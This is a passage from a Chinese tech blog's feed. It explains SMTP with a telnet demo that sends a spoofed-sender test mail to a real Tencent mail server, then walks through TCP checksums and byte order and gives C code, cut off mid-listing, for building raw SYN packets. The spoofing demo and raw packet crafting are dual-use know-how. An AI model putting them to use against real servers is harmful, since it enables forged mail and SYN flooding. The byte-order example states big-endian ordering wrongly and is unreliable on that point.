    <content type="html"><![CDATA[<p>在网络协议上，高层协议确实比底层协议更容易理解，也更加的人性化。<br>传输层的 TCP, UDP 都还停留在各种字节内容的整合和校验上，而更上层的应用层协议就已经能够直观到通过直接解读就能理解其每条消息的含义了。</p><a id="more"></a><h2 id="SMTP-协议"><a href="#SMTP-协议" class="headerlink" title="SMTP 协议"></a>SMTP 协议</h2><p>SMTP，简单邮件传输协议。单从协议内容上来说确实没有太多的学习难度。但是，扭转“常识”恰恰是巨大的绊脚石。<br>直接就进入了网页邮件系统 or 客户端邮件系统的时代。图形化的界面配合上一些关键字的内容 (比如收件人，主题等)。<br>点击发送就觉得一封邮件已经发出去了。</p><p>但是，究竟这中间做了什么呢？<br>163，GMAIL, QQ 等邮箱究竟又在其中扮演着怎样的一个角色？</p><p>首先，SMTP 是为了高效、可靠地传递邮件而存在的。</p><p>下面先给一段演示。通过 telnet 连接到 183.57.48.34 (这个是腾讯企业邮其中一台机器的 IP) 25 (SMTP 服务端口) ，以本机作为 SMTP 的客户端，而将 183.XXX 作为 SMTP 的服务端，来完成邮件信息的一次交互。 (当然，最后失败了。被企业邮识别为垃圾邮件了…)</p><p>下列每行 <code>#</code> 开始及之后的内容是个人添加的注释，其它内容是 telnet 交互的内容。<br>同时，<code>--</code> 标志该行内容由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 183.57.48.34 25</span><br><span class="line">Trying 183.57.48.34...</span><br><span class="line">Connected to 183.57.48.34.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">220 bizmx17.qq.com MX QQ Mail Server</span><br><span class="line">HELO test                               -- # MEANS HELLO &lt;domain&gt; 在每次建立连接通道后，发送的第一条消息</span><br><span class="line">250 bizmx17.qq.com                         # 服务器的回复值 Code 250 </span><br><span class="line">MAIL FROM: &lt;from@test.net&gt;              -- # MAIL 表示邮件的发起方，用于退信等其他邮件反向事件</span><br><span class="line">250 Ok                                   </span><br><span class="line">RCPT TO: &lt;to@xxx.xxx&gt;                   -- # RCPT 表示邮件的接收方，用于投递邮件等正向事件</span><br><span class="line">250 Ok</span><br><span class="line">DATA                                    -- # DATA 表示之后的内容将作为邮件正文 (正文这个描述可能不太恰当，更应该是等同于信封内的所有内容)</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">                                        --</span><br><span class="line">It&apos;s a fake mail.                       -- # 邮件正文，其实还可以写上诸如 &apos;Subject: XXX&apos; &apos;Cc: XXX&apos; 的内容</span><br><span class="line">.                                       -- # 正文内容结束的标志，&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">550 Mail content denied. http://service.exmail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000726 # 这里很无奈，没腾讯给拦了，没发出去。不过反正是假的，邮件信息不全。</span><br></pre></td></tr></table></figure><h3 id="几个主要的-SMTP-交互指令"><a href="#几个主要的-SMTP-交互指令" class="headerlink" title="几个主要的 SMTP 交互指令"></a>几个主要的 SMTP 交互指令</h3><ul><li>HELO: (HELLO)<br>  主要用于让 SMTP 服务器对当前连接的 SMTP 客户端(上例是 telnet 模拟的) 建立一个身份标志 (一般是当前的主机名)</li><li>MAIL:<br>  用法 MAIL FROM: <a href="mailto:&#x78;&#120;&#64;&#120;&#120;&#x2e;&#120;&#120;" target="_blank" rel="noopener">&#x78;&#120;&#64;&#120;&#120;&#x2e;&#120;&#120;</a> (不区分大小写)<br>  可以将其与普通信件的信封等同。毕竟都是要写上发信人，如果没人收信，也就可以根据这个声明将信件退回。</li><li>RCPT: (RECIPIENT)<br>  用法 RCPT TO: <a href="mailto:&#x78;&#x78;&#x40;&#120;&#x78;&#x2e;&#120;&#x78;" target="_blank" rel="noopener">&#x78;&#x78;&#x40;&#120;&#x78;&#x2e;&#120;&#x78;</a> (可多次重复声明，即将一封信件复制多次投送给每次声明的对象)<br>  相当于普通信件的收信人。不过也有点区别，毕竟普通信件没法一件多发嘛。</li><li>DATA:<br>  <code>DATA</code> 之后到 <code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code> 之前的所有内容都作为邮件的正文内容。等同于普通信件信封内的信纸(当然了，信纸上在写上 <code>To XXX:</code> <code>Yours XXX</code> 也是很正常的嘛)，类似的也就是 DATA 数据中也可以包括 <code>Subject:</code> (主题), <code>From:</code> (写信人), <code>Date:</code> (日期), <code>To:</code>(收件人)等内容。</li></ul><hr><h3 id="几个次要的-SMTP-交互指令"><a href="#几个次要的-SMTP-交互指令" class="headerlink" title="几个次要的 SMTP 交互指令"></a>几个次要的 SMTP 交互指令</h3><ul><li><p>RSET: (Reset)<br>  重置，丢弃之前针对邮件所描述的所有内容，重新开始。</p></li><li><p>VRFY: (VERIFY)<br>  用于确认收件人是否存在，以及收件人的完整地址</p></li><li><p>NOOP:<br>  强制服务器做出一个回应，没有实际意义。</p></li><li><p>QUIT:<br>  要求收信服务器返回一个邮件接收成功的信号，之后释放连接通道。</p></li></ul><h2 id="SMTP-扩展"><a href="#SMTP-扩展" class="headerlink" title="SMTP 扩展"></a>SMTP 扩展</h2><p>前面描述了这么多，应该来说找一些支持 TCP (或者其他稳定的传输层连接也是可以的) 连接的命令就完全可以支持一次邮件发送的需求。</p><p>但是，如果想要发送一些中文字符之类的，马上就出现了问题。</p><p>这里有几种方式，但本人还没有理解透彻。仅列出知道的可行方案。</p><ul><li>通过 IMF (Internet Message Format) 进行发件</li><li>通过 ESMTP </li></ul><h2 id="SMTP-安全"><a href="#SMTP-安全" class="headerlink" title="SMTP 安全"></a>SMTP 安全</h2><p>出于 SMTP 本身协议的设计，没有一个有效的身份认证机制。</p><p>纵使通过 <code>MAIL FROM: &lt;A@test.net&gt;</code> 在信封上写明了是由 A 发出的信件。<br>但是，装在信封内的信纸却可以属上另一个人的名字。</p><p>利用这种规则，也就出现了伪装发信人这样的操作。当然，现在的大量邮箱服务提供商都会对这种情况进行标记。</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fvpbzedf67j315e01q0sp.jpg" alt="“代发”标记"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://tools.ietf.org/html/rfc821" target="_blank" rel="noopener">SIMPLE MAIL TRANSFER PROTOCOL</a></li><li><a href="http://www.ruanyifeng.com/blog/2008/06/mime.html" target="_blank" rel="noopener">MIME</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在网络协议上，高层协议确实比底层协议更容易理解，也更加的人性化。&lt;br&gt;传输层的 TCP, UDP 都还停留在各种字节内容的整合和校验上，而更上层的应用层协议就已经能够直观到通过直接解读就能理解其每条消息的含义了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mail" scheme="https://DorMOUSE-None.github.io/tags/mail/"/>
    
      <category term="SMTP" scheme="https://DorMOUSE-None.github.io/tags/SMTP/"/>
    
      <category term="TCP" scheme="https://DorMOUSE-None.github.io/tags/TCP/"/>
    
  </entry>
  
  <entry>
    <title>TCP SYN 包模拟</title>
    <link href="https://DorMOUSE-None.github.io/2018-09-18-TCP-SYN/"/>
    <id>https://DorMOUSE-None.github.io/2018-09-18-TCP-SYN/</id>
    <published>2018-09-17T16:00:00.000Z</published>
    <updated>2018-09-18T10:05:46.320Z</updated>
    
    <content type="html"><![CDATA[<p>写了两天，几乎是从零开始，C 语言搞了一个发 TCP SYN 包的小程序。<br>从协议到程序代码的转换，确实没有花费太多的时间，但是为了字节序(byteorder)的问题简直折腾得…</p><a id="more"></a><h2 id="TCP-首部格式"><a href="#TCP-首部格式" class="headerlink" title="TCP 首部格式"></a>TCP 首部格式</h2><p>从 RFC 793 了解到基础的 TCP 首部格式(当然，模拟三次握手的 SYN 包也根本不需要填充任何数据)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          Source Port          |       Destination Port        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                        Sequence Number                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Acknowledgment Number                      |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Data |           |U|A|P|R|S|F|                               |</span><br><span class="line">| Offset| Reserved  |R|C|S|S|Y|I|            Window             |</span><br><span class="line">|       |           |G|K|H|T|N|N|                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|           Checksum            |         Urgent Pointer        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                             data                              |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>对于仅仅模拟一个 SYN 包而言，似乎无需关心 Sequence Number, Ack Number, Window 等信息，毕竟都不关心服务器端给的返回。<br>最低的要求，仅仅是发一个合法的 TCP 报文，得到服务器端的反馈，而非直接被服务器端丢弃(如果被验证到报文非法或者数据出错等)。</p><p>那么，最为重要的细节就是 Checksum (校验和) 了。服务器端会对接收到的数据流进行校验，如果有差错，则直接丢弃，而无任何结果。</p><h2 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h2><p>从细节上来说，网络协议中的校验和显得比较简单。以 TCP 协议的 Checksum 字段举例，就是为了让伪首部(TCP 首部 + source IP + destination IP 等一些额外信息)<br>以每 16 位 (2 字节) 为一个单位，循环累加和最终达到 0xFFFF 的效果。</p><p>下面以一个由 Source IP: 172.16.2.101 -&gt; Destination IP: 172.16.2.127 的 TCP 首部为例进行细节描述:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 总长为 20 字节的 TCP 报文首部</span><br><span class="line">27 11 0f a0 00 00 00 00 00 00 00 00 50 02 ff 00 1d 2c 00 00</span><br><span class="line"></span><br><span class="line">src Port: 0x2711 -&gt; 10001</span><br><span class="line">dst Port: 0x0fa0 -&gt; 4000</span><br><span class="line">Seq nr: 0x00000000 -&gt; 0</span><br><span class="line">Ack nr: 0x00000000 -&gt; 0</span><br><span class="line">Data off: 5 -&gt; 32 bits 数量是 5 -&gt; 20 字节 (即 TCP 首部长度为 20 字节)</span><br><span class="line">FLAG: 0x02 -&gt; urg ack psh rst SYN fin </span><br><span class="line">Window: 0xFF00 (窗口大小为 65280 字节)</span><br><span class="line">chk sum: 0x1d2c</span><br><span class="line">urg pointer: 0x0000</span><br></pre></td></tr></table></figure><p>在计算之前，TCP 校验和还将涉及到伪首部的概念</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           Source Address          |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|         Destination Address       |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|  zero  |  PTCL  |    TCP Length   |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line"></span><br><span class="line">在此例中:</span><br><span class="line">Source Address: 172.16.2.101 -&gt; 0xAC100265</span><br><span class="line">Destination Address: 172.16.2.127 -&gt; 0XAC10027F</span><br><span class="line">zero: 0x00</span><br><span class="line">PTCL(protocol): TCP(6) -&gt; 0x06</span><br><span class="line">TCP Length: 20 bytes -&gt; 0x0014</span><br></pre></td></tr></table></figure><p>即加上伪首部的内容，需要共同进行校验的数据流如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ac 10 02 65 ac 10 02 7f 00 06 00 14 27 11 0f a0 00 00 00 00 00 00 00 00 50 02 ff 00 1d 2c 00 00</span><br></pre></td></tr></table></figure></p><h3 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h3><p>服务器端接收到 TCP 报文后，将对整个需要校验的数据流，按 16 bits (2字节) 为单位，进行累加。</p><p>即: <code>0xac10+0x0265+0xac10+0x027f+0x0006+0x0014+0x2711+0x0fa0+0x0000+0x0000+0x0000+0x0000+0x5002+0xff00+0x1d2c+0x0000 = 0x2fffd</code></p><p>对于超长计算结果 (超出 0xFFFF) ，循环将高位右移 16 位与低位进行累加，直到结果 &lt;= 0xFFFF ，即 <code>0x20000 &gt;&gt; 16 + 0xfffd = 0xffff</code></p><p>如果最终结果 <code>=0xffff</code>(全为 1) ，则认为 TCP 首部没有问题，服务器端接收报文，并回复 ACK SYN 包。</p><h3 id="客户端构造校验和"><a href="#客户端构造校验和" class="headerlink" title="客户端构造校验和"></a>客户端构造校验和</h3><p>与服务器端相对，显然客户端必须通过 Check sum ，使得最终的结果服务器端校验的条件。</p><p>作为反向问题，同样以上面为例子，假设 check sum 还未确定具体的值。则计算方式如下:</p><p>加上伪首部, 校验和暂时置零的数据流</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ac 10 02 65 ac 10 02 7f 00 06 00 14 27 11 0f a0 00 00 00 00 00 00 00 00 50 02 ff 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>作为逆过程，按 16 bits 为单位，进行累加。即: <code>0xac10+0x0265+0xac10+0x027f+0x0006+0x0014+0x2711+0x0fa0+0x0000+0x0000+0x0000+0x0000+0x5002+0xff00+0x0000+0x0000 = 0x2e2d1</code></p><p>超长部分循环累加，<code>0x20000 &gt;&gt; 16 + 0xe2d1 = 0xe2d3</code></p><p>结果取反，<code>~ 0xe2d3 = 0x1d2c</code></p><p>即认为 <code>0x1d2c</code> 为校验和</p><h2 id="HBO-与-NBO"><a href="#HBO-与-NBO" class="headerlink" title="HBO 与 NBO"></a>HBO 与 NBO</h2><p>HBO: host byte order<br>NBO: network byte order </p><p>说起字节序简直能够把人逼疯，说实话虽然有一定的历史原因，但是不做统一真的对底层编程相当得不友好。</p><p>不过，再厌烦也不能改变什么。总还得继续写代码不是嘛。</p><h3 id="主机字节序-HBO-Host-Byte-Order"><a href="#主机字节序-HBO-Host-Byte-Order" class="headerlink" title="主机字节序 (HBO, Host Byte Order)"></a>主机字节序 (HBO, Host Byte Order)</h3><p>采用小端字节排序方式。简单描述为 高位字节存放在内存的高地址处，低位字节存储在内存的低地址处。</p><p>以 4 字节 int 型数据 0xAB1267EF 为例:</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fvdu3zhh92j31040newel.jpg" alt=""></p><p>而程序读取数据的顺序，如果不考虑数据类型，按字节读取，普遍将采用字节递增序读取，则优先将读到 0xEF 等低位字节数据</p><h3 id="网络字节序-NBO-Network-Byte-Order"><a href="#网络字节序-NBO-Network-Byte-Order" class="headerlink" title="网络字节序 (NBO, Network Byte Order)"></a>网络字节序 (NBO, Network Byte Order)</h3><p>采用大端字节排序方式。简单描述为通过网络接收到数据时将优先接收到数据的高位字节，然后再得到低位字节。</p><p>还是以 4 字节 int 型数据 0xAB1267EF 为例:</p><p>则通过网络得到的数据流将是 <code>0xEF 0x67 0x12 0xAB</code></p><h3 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h3><p>C 语言，BSD 平台的 netinet/tcp.h 定义了 tcp header 结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>th_sport;<span class="comment">/* source port */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>th_dport;<span class="comment">/* destination port */</span></span><br><span class="line">tcp_seqth_seq;<span class="comment">/* sequence number */</span></span><br><span class="line">tcp_seqth_ack;<span class="comment">/* acknowledgement number */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DARWIN_BYTE_ORDER == __DARWIN_LITTLE_ENDIAN</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>th_x2:<span class="number">4</span>,<span class="comment">/* (unused) */</span></span><br><span class="line">th_off:<span class="number">4</span>;<span class="comment">/* data offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DARWIN_BYTE_ORDER == __DARWIN_BIG_ENDIAN</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>th_off:<span class="number">4</span>,<span class="comment">/* data offset */</span></span><br><span class="line">th_x2:<span class="number">4</span>;<span class="comment">/* (unused) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>th_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_FIN0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_SYN0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_RST0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_PUSH0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_ACK0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_URG0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_ECE0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_CWR0x80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>TH_FLAGS(TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>th_win;<span class="comment">/* window */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>th_sum;<span class="comment">/* checksum */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>th_urp;<span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于 <code>unsigned char</code> 之类的单字节数据，将不存在任何问题。但是，诸如 <code>unsigned short</code> 等多字节数据，将涉及到字节序的转换。</p><p>比如，虽然令 <code>th_sport = 0x2711 (10001)</code> 看似合理。但是，从内存的角度来看，数据将被存储为 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 假设起始物理内存地址为 0x00007c000</span><br><span class="line">0x00007c01: 0x27 </span><br><span class="line">0x00007c00: 0x11</span><br></pre></td></tr></table></figure><p>等到构造完 TCP 首部，顺次地发送数据时，呈现的数据流将形如: <code>0x11 0x27...</code> 即使用里 HBO (小端字节序) 的数据无法满足 NBO (大端字节序) 的要求。<br>毕竟，两者相互对立。</p><p>因此，需要特别注意字节序的问题。当然，C 语言还是想当友好地提供了字节序转换的工具 <code>htons</code>, <code>htonl</code>, <code>ntohs</code>, <code>ntohl</code> 。详情请通过 <code>man byteorder</code> 查看。</p><h2 id="TCP-SYN-的简单例程"><a href="#TCP-SYN-的简单例程" class="headerlink" title="TCP SYN 的简单例程"></a>TCP SYN 的简单例程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * +--------+--------+--------+--------+</span></span><br><span class="line"><span class="comment"> * |           Source Address          |</span></span><br><span class="line"><span class="comment"> * +--------+--------+--------+--------+</span></span><br><span class="line"><span class="comment"> * |         Destination Address       |</span></span><br><span class="line"><span class="comment"> * +--------+--------+--------+--------+</span></span><br><span class="line"><span class="comment"> * |  zero  |  PTCL  |    TCP Length   |</span></span><br><span class="line"><span class="comment"> * +--------+--------+--------+--------+</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudohdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> src_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> dst_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> zero:<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> protocol:<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> tcp_length;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcpHdr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *ptr, <span class="keyword">size_t</span> nbytes)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(nbytes &gt; <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        sum += htons(*ptr++);</span><br><span class="line">        nbytes -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xFFFF</span>);</span><br><span class="line"></span><br><span class="line">    sum = ~sum;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">short</span>) sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct tcphdr * <span class="title">init_tcp_header</span><span class="params">(<span class="keyword">int</span> sport)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> * <span class="title">header</span> = (<span class="title">struct</span> <span class="title">tcphdr</span> *) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">tcphdr</span>));</span></span><br><span class="line">    header-&gt;th_sport = htons(sport);    <span class="comment">// 源端口</span></span><br><span class="line">    header-&gt;th_dport = htons(<span class="number">4000</span>);     <span class="comment">// 目标端口</span></span><br><span class="line">    header-&gt;th_seq = <span class="number">0</span>;                <span class="comment">// 序列号</span></span><br><span class="line">    header-&gt;th_ack = <span class="number">0</span>;                <span class="comment">// 确认序号 | ACK 置位时有效</span></span><br><span class="line">    header-&gt;th_off = <span class="keyword">sizeof</span>(struct tcphdr) / <span class="number">4</span>;   <span class="comment">// TCP 首部长度 (字节)</span></span><br><span class="line">    header-&gt;th_flags = TH_SYN;      <span class="comment">// 标志位</span></span><br><span class="line">    header-&gt;th_win = <span class="number">255</span>;           <span class="comment">// 数据窗口大小</span></span><br><span class="line">    header-&gt;th_sum = 